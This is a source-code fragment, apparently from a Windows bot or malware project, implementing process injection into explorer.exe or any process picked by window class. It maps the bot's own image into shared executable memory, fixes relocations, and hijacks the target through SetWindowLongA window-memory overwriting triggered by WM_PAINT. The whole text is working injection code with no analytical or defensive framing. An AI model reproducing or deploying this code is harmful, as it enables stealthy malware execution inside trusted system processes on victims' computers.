	PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)param->imageBase;
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);
	DWORD imageSize = pe->OptionalHeader.SizeOfImage;
	ULONG relocRVA   = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	ULONG relocSize  = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	ProcessRelocs( (PIMAGE_BASE_RELOCATION)( (DWORD)param->imageBase + relocRVA ), (DWORD)param->imageBase, (DWORD)param->imageBase - pe->OptionalHeader.ImageBase, relocSize );	

	InitializeAPI();
	HANDLE ev = pOpenEventA( EVENT_MODIFY_STATE, FALSE, "inject32_event" );
	if( ev ) pSetEvent(ev);
//	pOutputDebugStringA( "NewInject to process is OK" );

	TInjectFunction func = (TInjectFunction)((DWORD)param->imageBase + (DWORD)param->func);
	func(0);
	return 0;
}

bool InjectToProcess32( TInjectFunction func, DWORD pid, HWND wnd )
{
	bool ret = false;
	HANDLE sectionHandle;
	PVOID ourMapAddress = NULL;
	DWORD ourMapSize;
	if( OpenSectionForInject( &sectionHandle, &ourMapAddress, &ourMapSize ) )
	{
		DWORD sizeOfShellCode = (DWORD)Inject32End - (DWORD)Inject32Start;

		DWORD sizeOfShellCodeWithData = sizeOfShellCode + sizeof(INJECT32_DATA);

		INJECT32_DATA* ourMapInjectData = (INJECT32_DATA*)(((DWORD)ourMapAddress + ourMapSize) - sizeOfShellCodeWithData); 
		m_memset( ourMapInjectData, 0, sizeOfShellCodeWithData );
		m_memcpy( &ourMapInjectData->injectCode[0], Inject32Start, sizeOfShellCode);

		HANDLE kernel32 = (HANDLE)pGetModuleHandleA("kernel32.dll");
		HANDLE user32 = (HANDLE)pGetModuleHandleA("user32.dll");
		*(PVOID*)&ourMapInjectData->codeData._CloseHandle = pGetProcAddress( kernel32, "CloseHandle" );
		*(PVOID*)&ourMapInjectData->codeData._MapViewOfFile = pGetProcAddress( kernel32, "MapViewOfFile" );
		*(PVOID*)&ourMapInjectData->codeData._OpenFileMappingA = pGetProcAddress( kernel32, "OpenFileMappingA" );
		*(PVOID*)&ourMapInjectData->codeData._CreateThread = pGetProcAddress( kernel32, "CreateThread" );
		*(PVOID*)&ourMapInjectData->codeData._OutputDebugStringA = pGetProcAddress( kernel32, "OutputDebugStringA" );
		*(PVOID*)&ourMapInjectData->codeData._SetWindowLongA = pGetProcAddress( user32, "SetWindowLongA" );

		INJECT32_DATA* remoteShellCodeMap;
		if( remoteShellCodeMap = InjectExplore32CreateSH( pid, ourMapInjectData, sizeOfShellCodeWithData, sizeOfShellCode ) )
		{
			//HWND wnd = (HWND)pFindWindowA( "Shell_TrayWnd", NULL );
			LONG oldLong = (LONG)pGetWindowLongA( wnd, 0 );

			if( wnd && oldLong )
			{
				ourMapInjectData->codeData.injectFlag = FALSE;
				ourMapInjectData->codeData.wnd = wnd;
				ourMapInjectData->codeData.oldLong = oldLong;
				
				DWORD imageBase = (DWORD)GetImageBase();
				ourMapInjectData->codeData.injectNormalRoutine = (PVOID)((DWORD)Inject32Normal - imageBase);
				ourMapInjectData->codeData.param.func = (PVOID)((DWORD)func - imageBase);

				plstrcpyA( ourMapInjectData->codeData.sectionName, "inject32_section" );
				ourMapInjectData->codeData.temp[0] = '1';
				ourMapInjectData->codeData.temp[1] = 0;

				PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)imageBase;
				PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);
				DWORD imageSize = pe->OptionalHeader.SizeOfImage;
				HANDLE map = (HANDLE)pCreateFileMappingA( 0, NULL, PAGE_EXECUTE_READWRITE | SEC_COMMIT, 0, imageSize, ourMapInjectData->codeData.sectionName );
				if( map )
				{
					PVOID mapping = pMapViewOfFile( map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0 );
					if( mapping )
					{
						m_memcpy( mapping, (void*)imageBase, imageSize );

						//восстанивливаем адрес по таблице релоков на основе ImageBase бота
						ULONG relocRVA   = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
						ULONG relocSize  = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
						ProcessRelocs( (PIMAGE_BASE_RELOCATION)( imageBase + relocRVA ), (DWORD)mapping, pe->OptionalHeader.ImageBase - imageBase, relocSize );	

						HANDLE ev;
						if( ev = pCreateEventA( NULL, 0, 0, "inject32_event" ) )
						{
							pSetWindowLongA( wnd, 0, (LONG)&remoteShellCodeMap->newLongVTable[0] );
							pSendNotifyMessageA( wnd, WM_PAINT, 0, 0 );

							if( !pWaitForSingleObject( ev, 60000 ) )
								ret = true;
							pCloseHandle(ev);
						}
						pUnmapViewOfFile(mapping);
					}
				}
			}
		}
		pNtUnmapViewOfSection( NtCurrentProcess(), ourMapAddress );
		pNtClose(sectionHandle);
	}
	return ret;
}

bool InjectExplore32( TInjectFunction func )
{
	DWORD pid = GetExplorerPid();
	HWND wnd = (HWND)pFindWindowA( "Shell_TrayWnd", NULL );
	return InjectToProcess32( func, pid, wnd );
}

bool InjectToProcess32( TInjectFunction func, const char* classWnd )
{
	HWND wnd = (HWND)pFindWindowA( classWnd, NULL );
	DWORD pid;
	pGetWindowThreadProcessId( wnd, &pid );
	return InjectToProcess32( func, pid, wnd );
}

}

